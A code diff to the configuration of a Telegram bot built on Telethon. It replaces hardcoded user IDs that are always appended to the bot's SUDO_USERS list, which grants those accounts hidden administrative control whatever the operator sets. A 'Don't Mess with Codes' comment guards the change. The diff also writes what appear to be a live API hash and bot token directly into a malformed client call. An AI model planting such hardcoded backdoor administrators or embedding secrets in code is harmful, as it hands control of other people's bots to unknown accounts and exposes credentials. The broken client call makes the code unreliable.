@@ -40,19 +40,19 @@ BOT_TOKEN8 = config("BOT_TOKEN8", default=None)
 BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USERS:
-    SUDO_USERS.append(1517994352)
+if 1841914911 not in SUDO_USERS:
+    SUDO_USERS.append(1841914911)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
 # Don't Mess with Codes !! 
 DB_URI = config("DATABASE_URL", None)
 SUDO_USERS.append(OWNER_ID)
-SUDO_USERS.append(1789859817)
+SUDO_USERS.append(6285272906)
 
 # Tokens
 
-Riz = TelegramClient('Riz', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+Riz = TelegramClient('Riz', 'API_ID', "26702190", 'API_HASH', "175c63334b2f3aefb1230d19695dd918").start(bot_token="6782400042:AAEO1vJ5ECr5y42TOI0csp6ZMcK6nL3w6zU")
 
 Riz2 = TelegramClient('Riz2', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)
 
